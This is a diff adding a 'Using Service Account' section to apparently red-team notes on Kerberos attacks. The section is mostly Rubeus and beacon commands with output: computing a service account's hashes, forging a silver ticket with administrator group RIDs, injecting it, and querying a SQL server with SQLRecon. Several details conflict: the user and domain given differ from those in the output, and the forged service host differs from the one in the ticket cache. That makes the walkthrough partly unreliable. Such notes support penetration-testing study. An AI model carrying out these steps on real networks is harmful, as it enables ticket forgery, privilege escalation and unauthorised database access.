@@ -79,6 +79,66 @@ run klist
 run klist purge
 ```
 
+### USING SERVICE ACCOUNT
+
+```powershell
+PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe hash /user:MSSQLSvc /domain:dublin.contoso.com /password:Passw0rd!
+
+[*] Action: Calculate Password Hash(es)
+
+[*] Input password             : Passw0rd!
+[*] Input username             : mssql_svc
+[*] Input domain               : CONTOSO.COM
+[*] Salt                       : CONTOSO.COMmssql_svc
+[*]       rc4_hmac             : FC525C9683E8FE067095BA2DDC971889
+[*]       aes128_cts_hmac_sha1 : 53B5F3804FBF13E7DD624E71D18DF9BB
+[*]       aes256_cts_hmac_sha1 : E4A51DAD46B6D1BA85627EEC82991C8FC94C279CE06140751E02BA015E6A21F9
+[*]       des_cbc_md5          : DF91ECCDAE70BA0E
+```
+
+Then forge the service ticket for MSSQLSvc/dub-sql-2.dublin.contoso.com.
+
+```powershell
+PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /service:MSSQLSvc/dub-sql-2.dublin.contoso.com /rc4:FC525C9683E8FE067095BA2DDC971889 /user:Admi /id:1108 /groups:513,1106,1107,4602 /domain:CONTOSO.COM /sid:S-1-5-21-3926355307-1661546229-813047887 /nowrap
+
+```
+
+Where:
+
+- `/id` is the RID for rsteel.
+    
+- `/groups` are the RIDs of rsteel's group membership.  513 is 'Domain Users', 1106 is 'Workstation Admins', 1107 is 'Server Admins', and 4602 is 'Database Admins'.
+
+```powershell
+beacon> make_token CONTOSO\rsteel FakePass
+[+] Impersonated CONTOSO\rsteel (netonly)
+
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:doIFVzCCBVOgAwIBBaEDAgEWooIETjCCBEphggRG<SNIP>
+[*] Action: Import Ticket
+[+] Ticket successfully imported!
+
+beacon> run klist
+
+Current LogonId is 0:0x179c863
+
+Cached Tickets: (1)
+
+#0>	Client: rsteel @ CONTOSO.COM
+	Server: MSSQLSvc/lon-db-1.contoso.com:1433 @ CONTOSO.COM
+	KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
+	Ticket Flags 0x40a00000 -> forwardable renewable pre_authent 
+	Start Time: 3/4/2025 12:39:29 (local)
+	End Time:   3/4/2025 22:39:29 (local)
+	Renew Time: 3/11/2025 12:39:29 (local)
+	Session Key Type: RSADSI RC4-HMAC(NT)
+	Cache Flags: 0 
+	Kdc Called:
+    
+beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:lon-db-1.contoso.com /m:info
+
+```
+
+
 ---
 ##### Golden Ticket
 
